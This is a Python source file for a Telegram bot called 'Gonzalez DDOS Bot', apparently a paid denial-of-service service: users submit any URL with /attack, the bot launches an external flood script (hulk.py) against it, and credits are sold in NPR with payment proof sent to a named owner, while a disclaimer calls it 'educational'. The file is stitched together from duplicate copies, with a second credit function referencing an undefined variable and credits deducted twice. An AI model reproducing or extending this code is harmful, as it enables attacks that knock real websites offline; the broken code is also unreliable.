import subprocess
import json
import os
from datetime import datetime
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# Load environment variables from .env if present
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 8158960738

# Store the hulk.py process globally
hulk_process = None

async def credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    is_admin = int(user_id) == ADMIN_ID
    username = update.effective_user.username or "N/A"
    first_name = update.effective_user.first_name or "N/A"
    credits_file = "user_credits.json"
    try:
        with open(credits_file, "r") as f:
            credits_data = json.load(f)
    except Exception:
        credits_data = {"users": {}}
    user_credits = credits_data["users"].get(user_id, {"credits": 2, "is_premium": False, "attacks": 0})
    if is_admin:
        await update.message.reply_text(
            f"<blockquote>User: <b>{first_name}</b> (@{username})\nUser ID: <code>{user_id}</code>\nCredits: <b>Unlimited</b>\nPremium: <b>Unlimited</b>\nAttacks: <b>Unlimited</b></blockquote>",
            parse_mode="HTML"
        )
    else:
        await update.message.reply_text(
            f"<blockquote>User: <b>{first_name}</b> (@{username})\nUser ID: <code>{user_id}</code>\nCredits: <b>{user_credits['credits']}</b>\nPremium: <b>{'Yes' if user_credits.get('is_premium', False) else 'No'}</b>\nAttacks: <b>{user_credits.get('attacks', 0)}</b></blockquote>",
            parse_mode="HTML"
        )
async def ads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = int(update.effective_user.id)
    if user_id != ADMIN_ID:
        await update.message.reply_text("You are not admin.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /ads <message>")
        return
    message = ' '.join(context.args)
    credits_file = "user_credits.json"
    try:
        with open(credits_file, "r") as f:
            credits_data = json.load(f)
    except Exception:
        credits_data = {"users": {}}
    # Broadcast to all users except admin
    for uid in credits_data["users"]:
        if int(uid) != ADMIN_ID:
            try:
                await context.bot.send_message(chat_id=int(uid), text=f"<b>?? Announcement:</b>\n{message}", parse_mode="HTML")
            except Exception:
                pass
    await update.message.reply_text("Ad sent to all users.")
async def addcredit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = int(update.effective_user.id)
    if user_id != ADMIN_ID:
        await update.message.reply_text("You are not admin.")
        return
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /addcredit <user_id> <amount>")
        return
    target_id = context.args[0]
    try:
        amount = int(context.args[1])
    except:
        await update.message.reply_text("Amount must be an integer.")
        return
    credits_file = "user_credits.json"
    try:
        with open(credits_file, "r") as f:
            credits_data = json.load(f)
    except Exception:
        credits_data = {"users": {}}
    if target_id not in credits_data["users"]:
        credits_data["users"][target_id] = {"credits": amount, "is_premium": False, "attacks": 0}
    else:
        credits_data["users"][target_id]["credits"] += amount
    with open(credits_file, "w") as f:
        json.dump(credits_data, f, indent=2)
    await update.message.reply_text(f"Added {amount} credits to user {target_id}.")

async def setpromo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = int(update.effective_user.id)
    global PROMO_CODES
    if user_id != ADMIN_ID:
        await update.message.reply_text("You are not admin.")
        return
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /setpromo <code> <percent>")
        return
    code = context.args[0].upper()
    try:
        percent = int(context.args[1])
        if percent < 1 or percent > 100:
            raise Exception()
    except:
        await update.message.reply_text("Percent must be integer 1-100.")
        return
    PROMO_CODES[code] = percent
    await update.message.reply_text(f"Promo code {code} set for {percent}% discount.")
PROMO_CODES = {}


import subprocess
import json
import os
from datetime import datetime
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# Load environment variables from .env if present
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 8158960738

# Store the hulk.py process globally
hulk_process = None

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    intro_text = (
        "<b>??? Gonzalez DDOS Bot ???</b>\n"
        "<blockquote>\n"
        "<b>Made with pride by Nepali ????</b>\n"
        "Unleash the power, test your limits!\n"
        "<b>Speed. Style. Strength. All in one bot.</b>\n\n"
        "<b>? For Educational & Research Purposes Only ?</b>\n"
        "Unauthorized or illegal use is strictly prohibited.\n\n"
        "<i>Owner: <a href='https://t.me/walterwhitenepal'>@walterwhitenepal</a></i>\n"
        "</blockquote>"
    )
    await update.message.reply_text(intro_text, parse_mode="HTML")
    # Send a second message with help usage and features
    features_text = (
        "<blockquote>\n"
        "Use <b>/help</b> to see all commands and usage instructions.\n\n"      
        "<b>Main Features:</b>\n"
        "? Stylish animated progress for attack and stop\n"
        "? Easy /attack &lt;url&gt; and /stop commands\n"
        "? Clean UI and quote formatting\n"
        "? <b>Educational Only</b>\n"
        "</blockquote>"
    )
    await update.message.reply_text(features_text, parse_mode="HTML")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):     
    user_id = int(update.effective_user.id)
    if user_id == ADMIN_ID:
        help_text = (
            "<blockquote>\n"
            "<b>Gonzalez DDOS Bot Admin Help</b>\n\n"
            "<b>/start</b> - Show welcome message\n"
            "<b>/help</b> - Show this help message\n"
            "<b>/attack &lt;url&gt;</b> - Start attack (unlimited)\n"
            "<b>/stop</b> - Stop the running attack\n"
            "<b>/credit</b> - Show your credits (unlimited)\n"
            "<b>/buy</b> - Show premium credit packages\n"
            "<b>/addcredit &lt;user_id&gt; &lt;amount&gt;</b> - Add credits to user\n"
            "<b>/setpromo &lt;code&gt; &lt;percent&gt;</b> - Create promo code\n"
            "<b>/adminhelp</b> - Show this admin help\n\n"
            "<i>Example:</i> <code>/addcredit 123456789 10</code>\n"
            "<i>Example:</i> <code>/setpromo NEWYEAR 20</code>\n"
            "</blockquote>"
        )
        await update.message.reply_text(help_text, parse_mode="HTML")
    else:
        help_text = (
            "<blockquote>\n"
            "<b>Gonzalez DDOS Bot Help</b>\n\n"
            "<b>/start</b> - Show welcome message\n"
            "<b>/help</b> - Show this help message\n"
            "<b>/attack &lt;url&gt;</b> - Start attack on the given URL\n"
            "<b>/stop</b> - Show how to stop the running attack\n"
            "<b>/credit</b> - Show your credits and info\n"
            "<b>/buy</b> - Show premium credit packages\n\n"
            "<i>Example:</i> <code>/attack http://example.com</code>\n\n"
            "<b>Note:</b> Only for education purpose. Safest DDOS with proxy & socks provided. Undetectable.\n"
            "</blockquote>"
        )
        await update.message.reply_text(help_text, parse_mode="HTML")

async def adminhelp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = int(update.effective_user.id)
    if user_id == ADMIN_ID:
        help_text = (
            "<blockquote>\n"
            "<b>Gonzalez DDOS Bot Admin Help</b>\n\n"
            "<b>/start</b> - Show welcome message\n"
            "<b>/help</b> - Show this help message\n"
            "<b>/attack &lt;url&gt;</b> - Start attack (unlimited)\n"
            "<b>/stop</b> - Stop the running attack\n"
            "<b>/credit</b> - Show your credits (unlimited)\n"
            "<b>/buy</b> - Show premium credit packages\n"
            "<b>/addcredit &lt;user_id&gt; &lt;amount&gt;</b> - Add credits to user\n"
            "<b>/setpromo &lt;code&gt; &lt;percent&gt;</b> - Create promo code\n"
            "<b>/adminhelp</b> - Show this admin help\n\n"
            "<i>Example:</i> <code>/addcredit 123456789 10</code>\n"
            "<i>Example:</i> <code>/setpromo NEWYEAR 20</code>\n"
            "</blockquote>"
        )
        await update.message.reply_text(help_text, parse_mode="HTML")
    else:
        await update.message.reply_text("You are not admin.")

async def buy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global PROMO_CODES
    pricing = [
        (20, 500),
        (30, 750),
        (50, 1250),
        (150, 2200),
    ]
    pricing_box = "<b>Premium Credit Packages:</b>\n"
    for c, p in pricing:
        pricing_box += f"? {c} credits = {p} NPR\n"
    pricing_box += "<b>Limited Time Offer:</b> 150 credits = 2200 NPR\n"
    promo_list = ""
    if PROMO_CODES:
        # Show only the latest promo code
        latest_code = list(PROMO_CODES.keys())[-1]
        percent = PROMO_CODES[latest_code]
        promo_list = f"<b>Active Promo Code:</b>\n? {latest_code} = {percent}% OFF\n"
    payment_box = "<b>Payment Options:</b> eSewa, Khalti, IME Pay, Bank Transfer\n<blockquote>Send payment proof to @walterwhitenepal</blockquote>"
    await update.message.reply_text(
        f"<blockquote>{pricing_box}{promo_list}{payment_box}</blockquote>",
        parse_mode="HTML"
    )

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    import asyncio
    import sys
    import os
    import platform
    user_id = str(update.effective_user.id)
    is_admin = int(user_id) == ADMIN_ID
    username = update.effective_user.username or "N/A"
    first_name = update.effective_user.first_name or "N/A"
    credits_file = "user_credits.json"
    try:
        with open(credits_file, "r") as f:
            credits_data = json.load(f)
    except Exception:
        credits_data = {"users": {}}
    user_credits = credits_data["users"].get(user_id, {"credits": 2, "is_premium": False, "attacks": 0})
    # Free trial info for new user (first /attack ever): only show info, do NOT proceed with attack
    if not is_admin and user_id not in credits_data["users"]:
        credits_data["users"][user_id] = user_credits
        with open(credits_file, "w") as f:
            json.dump(credits_data, f, indent=2)
        await update.message.reply_text(
            "<blockquote>\n<b>YOU ARE NOT SUBSCRIBED YET</b>\n\n"
            "<b>Note:</b> Only for education purpose. Safest DDOS with proxy & socks provided. Undetectable.\n\n"
            "<b>Free Trial:</b>\n? 2 free credits (2 attacks max)\n\n"
            "<b>Premium:</b>\nUse /buy to see all premium credit packages.\n\n"
            "</blockquote>",
            parse_mode="HTML"
        )
        if not is_admin:
                await context.bot.send_message(
                    chat_id=8158960738,
                    text=f"<blockquote>New user registered!\nUser: <b>{first_name}</b> (@{username})\nUser ID: <code>{user_id}</code>\nCredits: 2 (Free Trial)</blockquote>",
                    parse_mode="HTML"
                )
        return
    # Pricing info
    pricing = [
        (20, 500),
        (30, 750),
        (50, 1250),
        (150, 2200),
    ]
    pricing_box = "<b>Premium Packages:</b>\n"
    for c, p in pricing:
        pricing_box += f"? {c} credits = {p} NPR\n"
    pricing_box += "<b>Limited Time Offer:</b> 150 credits = 2200 NPR\n"        
    # If no credits, show premium info
    if not is_admin and user_credits["credits"] <= 0:
        await update.message.reply_text(
            f"<blockquote>\n<b>Insufficient credits!</b>\n\n<b>Free Trial:</b> 2 credits (2 attacks max)\n{pricing_box}\n<b>Payment Options:</b> eSewa, Khalti, IME Pay, Bank Transfer\n<blockquote>Send payment proof to @walterwhitenepal</blockquote>\nTo get more credits, buy a premium package.\n</blockquote>",
            parse_mode="HTML"
        )
        if not is_admin:
            await context.bot.send_message(
                chat_id=8158960738,
                text=f"<blockquote>User tried to attack with 0 credits!\nUser: <b>{first_name}</b> (@{username})\nUser ID: <code>{user_id}</code>\n</blockquote>",
                parse_mode="HTML"
            )
    # Show confirmation/info before attack
    if not context.args:
        await update.message.reply_text("Please provide a URL: /attack <url>")  
        return
    url = context.args[0]
    # No reply_text here if it is empty, or add a proper message
    await update.message.reply_text(f"<blockquote>Attack started on: <b>{url}</b></blockquote>", parse_mode="HTML")
    if not is_admin:
        await context.bot.send_message(
            chat_id=8158960738,
            text=f"<blockquote>Attack requested!\nUser: <b>{first_name}</b> (@{username})\nUser ID: <code>{user_id}</code>\nURL: <code>{url}</code>\nCredits before: <b>{user_credits['credits']}</b></blockquote>",
            parse_mode="HTML"
        )
    # Deduct credit and update
        user_credits["credits"] -= 1
    if not is_admin:
        user_credits["credits"] -= 1
        user_credits["attacks"] += 1
        credits_data["users"][user_id] = user_credits
        with open(credits_file, "w") as f:
            json.dump(credits_data, f, indent=2)
    # Animated progress (1 to 100 in 6 seconds)
    progress_msg = await update.message.reply_text("<b>Attack started!</b>\n<blockquote>Progress: 0%</blockquote>", parse_mode="HTML")
    for i in range(1, 101):
        await asyncio.sleep(0.06)
        if i % 5 == 0 or i == 100:
            await progress_msg.edit_text(f"<b>Attack started!</b>\n<blockquote>Progress: {i}%</blockquote>", parse_mode="HTML")
    # Run hulk.py after animation
    hulk_path = os.path.abspath('hulk.py')
    if not os.path.exists(hulk_path):
        await update.message.reply_text("hulk.py file not found. Please check that it is in this folder.")
        return
    system = platform.system().lower()
    if 'linux' in system or 'darwin' in system:
        python_cmd = 'python2'
        from shutil import which
        if which('python2') is None:
            await update.message.reply_text("python2 not found. Please install with: sudo apt install python2")
            return
    else:
        python_cmd = sys.executable
    try:
        global hulk_process
        hulk_process = subprocess.Popen([python_cmd, hulk_path, url], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        # Success message with quote and bold, plus credit info
        success_text = (
            f"<b>Your attack was successful!</b>\n"
            f"<blockquote>Website attacked: <b>{url}</b>\n"
            f"</blockquote>"
        )
        await update.message.reply_text(success_text, parse_mode="HTML")
        if not is_admin:
            await context.bot.send_message(
                chat_id=8158960738,
                text=f"<blockquote>Attack performed!\nUser: <b>{first_name}</b> (@{username})\nUser ID: <code>{user_id}</code>\nURL: <code>{url}</code>\nCredits left: <b>{user_credits['credits']}</b></blockquote>",
                parse_mode="HTML"
            )
        await context.bot.send_message(
            chat_id=8158960738,
            text=f"Attack performed!",
            parse_mode="HTML"
        )
    except Exception as e:
        hulk_process = None
        await update.message.reply_text(f"Error: {e}")

async def credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    is_admin = user_id in ADMIN_IDS
    username = update.effective_user.username or "N/A"
    username = update.effective_user.username or "N/A"
    first_name = update.effective_user.first_name or "N/A"
    credits_file = "user_credits.json"
    try:
        with open(credits_file, "r") as f:
            credits_data = json.load(f)
    except Exception:
        credits_data = {"users": {}}
    user_credits = credits_data["users"].get(user_id, {"credits": 2, "is_premium": False, "attacks": 0})
    if is_admin:
        await update.message.reply_text(
            f"<blockquote>User: <b>{first_name}</b> (@{username})\nUser ID: <code>{user_id}</code>\nCredits: <b>Unlimited</b>\nPremium: <b>Unlimited</b>\nAttacks: <b>Unlimited</b></blockquote>",
            parse_mode="HTML"
        )
    else:
        await update.message.reply_text(
            f"<blockquote>User: <b>{first_name}</b> (@{username})\nUser ID: <code>{user_id}</code>\nCredits: <b>{user_credits['credits']}</b>\nPremium: <b>{'Yes' if user_credits.get('is_premium', False) else 'No'}</b>\nAttacks: <b>{user_credits.get('attacks', 0)}</b></blockquote>",
                parse_mode="HTML"
            )
        # Removed admin notification for /credit command

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    import asyncio
    global hulk_process
    # Animated progress (1 to 100 in 6 seconds)
    progress_msg = await update.message.reply_text("<b>Stopping attack...</b>\n<blockquote>Progress: 0%</blockquote>", parse_mode="HTML")
    for i in range(1, 101):
        await asyncio.sleep(0.06)
        if i % 5 == 0 or i == 100:
            await progress_msg.edit_text(f"<b>Stopping attack...</b>\n<blockquote>Progress: {i}%</blockquote>", parse_mode="HTML")
    if hulk_process and hulk_process.poll() is None:
        hulk_process.terminate()
        hulk_process = None
        stop_text = (
            "<b>Attack stopped successfully!</b>\n"
            "<blockquote>The attack process has been terminated.</blockquote>"  
        )
        await update.message.reply_text(stop_text, parse_mode="HTML")
    else:
        await update.message.reply_text("<blockquote>No active attack or process already stopped.</blockquote>", parse_mode="HTML")

if __name__ == "__main__":
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("credit", credit))
    app.add_handler(CommandHandler("buy", buy))
    app.add_handler(CommandHandler("adminhelp", adminhelp))
    app.add_handler(CommandHandler("addcredit", addcredit))
    app.add_handler(CommandHandler("setpromo", setpromo))
    app.add_handler(CommandHandler("ads", ads))
    print("Bot running...")
    app.run_polling()





